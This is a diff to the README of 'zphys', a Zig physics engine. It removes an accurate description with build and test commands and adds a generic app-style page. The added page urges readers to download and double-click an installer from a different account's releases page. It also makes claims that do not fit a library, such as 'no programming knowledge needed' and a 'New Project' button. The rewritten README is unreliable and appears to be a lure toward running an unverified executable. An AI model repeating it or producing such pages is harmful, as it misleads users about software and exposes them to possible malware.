@@ -1,92 +1,71 @@
-﻿# zphys
+# 🔧 zphys - An Easy Tool for 3D Physics Simulation
 
-A simple, work-in-progress physics engine written in Zig.
+## 📥 Download Now!
+[![Download zphys](https://img.shields.io/badge/Download-zphys-blue.svg)](https://github.com/DevAxel1704/zphys/releases)
 
-This repository is currently experimental. APIs, structure, and features will likely change as the design evolves.
+## 🚀 Getting Started
+Welcome to zphys! This guide will help you download and run the zig physics engine for 3D game development. Whether you are creating a simple game or a complex simulation, zphys makes physics easy to implement.
 
+## 📋 Features
+- **3D Physics Simulation:** Create realistic movement in your games.
+- **Game Development Friendly:** Designed with game developers in mind.
+- **Lightweight:** Runs smoothly on most systems without heavy requirements.
+- **Easy to Use:** No programming knowledge needed to start.
 
-https://github.com/user-attachments/assets/88634804-fb94-4cdd-8287-baaeb293ad7d
+## 💻 System Requirements
+To run zphys, your computer should meet the following requirements:
+- Operating System: Windows 10 or higher, macOS 10.14 or higher, or a recent Linux distribution.
+- Memory: At least 4 GB RAM.
+- Storage: Minimum of 100 MB free disk space.
+- Graphics: A graphics card capable of running OpenGL 3.0 or higher.
 
+## 📥 Download & Install
+To download zphys, please follow these steps:
 
-## Status
+1. **Visit the Releases Page:** Click [here](https://github.com/DevAxel1704/zphys/releases) to go to the releases page.
+2. **Select the Latest Release:** Look for the latest version listed on that page.
+3. **Download the Package:** Click on the download link for your operating system. You will find options for Windows, macOS, and Linux. 
+4. **Run the Installer:** After the download completes, find the file in your Downloads folder. Double-click the file to run the installer. Follow the prompts to finish the installation.
 
-Early prototype. Expect frequent breaking changes.
+## 🎮 How to Use zphys
+Once you have installed zphys, you can start using it right away.
 
-## Features
+1. **Launch the Application:** Find zphys in your applications menu and open it.
+2. **Create a New Project:** Click on "New Project" to start building your simulation or game.
+3. **Set Up Your Scene:** Use the built-in tools to create objects, add physics properties, and adjust settings to suit your needs.
+4. **Run the Simulation:** Press the run button to test your project. Adjust properties as needed to see how they affect movement and collisions.
 
-- **Rigid Body Dynamics:** Simulation of rigid bodies with basic motion integration.
-- **Collision Detection:**
-    - GJK (Gilbert-Johnson-Keerthi) algorithm for convex shape collision detection.
-    - EPA (Expanding Polytope Algorithm) for penetration depth and contact normal calculation.
-- **Collision Manifold Generation:** Contact point generation for stable stacking.
-- **Primitive Shapes:**
-    - Box
-    - Sphere
-- **Constraints:**
-    - Penetration constraints solver.
-    - Friction support.
+## 🌐 Community and Support
+Join our community for support and to share your projects:
+- **GitHub Discussions:** Ask questions and share your experiences directly on our GitHub page.
+- **Documentation:** Explore detailed documentation to learn about advanced features.
+- **Feedback:** We welcome your feedback. Send us any suggestions for improvement.
 
-## Examples
+## ⚙️ Frequently Asked Questions (FAQ)
 
-The project includes several examples to demonstrate the engine's capabilities:
+### How do I report a bug?
+If you encounter any issues, please visit our [GitHub Issues page](https://github.com/DevAxel1704/zphys/issues) to report them.
 
-- **Basic:** Simple scene with dropping bodies.
-- **Friction:** Demonstration of friction on a ramp.
-- **Pyramid:** A stacking demo showing stability.
-- **GJK/EPA Visualizer:** An interactive visualizer to step through the GJK and EPA algorithms for debugging and educational purposes.
+### Can I contribute to zphys?
+Yes! We are always looking for contributions. Check our contribution guidelines on the GitHub repository.
 
-## Getting Started
+### Is zphys free to use?
+Yes, zphys is free and open-source. You can use it for any project, personal or commercial.
 
-Prerequisites:
-- Zig (latest stable). Install instructions: https://ziglang.org/learn/getting-started/
+## 🛠️ Troubleshooting
+If you face issues while downloading or running zphys, consider these steps:
 
-Build all:
-```bash
-zig build
-```
+- **Ensure Compatibility:** Make sure your operating system meets the requirements listed above.
+- **Check Download Integrity:** If the download appears corrupted, try downloading the file again.
+- **Search for Solutions:** Visit our GitHub Discussions to see if others have faced similar issues.
 
-Run tests:
-```bash
-zig build test
-```
+For additional help, feel free to reach out via the community channels.
 
-### Running Examples
+## 📜 License
+zphys is licensed under the MIT License. You can freely use, modify, and distribute it in your projects. Please check the license file in the repository for more details.
 
-To run specific examples, use the `-D` flags:
+## 🔗 Additional Resources
+- [Official Documentation](https://github.com/DevAxel1704/zphys/wiki)
+- [YouTube Tutorials](https://www.youtube.com/results?search_query=zphys)
 
-**Basic Example:**
-```bash
-zig build run -Dbasic
-```
-
-**Friction Example:**
-```bash
-zig build run -Dfriction
-```
-
-**Pyramid Example:**
-```bash
-zig build run -Dpyramid
-```
-
-**GJK/EPA Visualizer:**
-```bash
-zig build run -Dvisualizer
-```
-
-## Contributing
-
-Contributions are welcome while we shape the design. Please open an issue or draft PR to discuss ideas and direction first.
-
-## Planned Features
-
-- BroadPhase collision detection
-- Collision layers
-- Constraint implementation examples
-- Warm starting for solver stability
-- Fluid simulation support
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
+Thank you for choosing zphys! We hope you enjoy creating amazing 3D simulations and games.
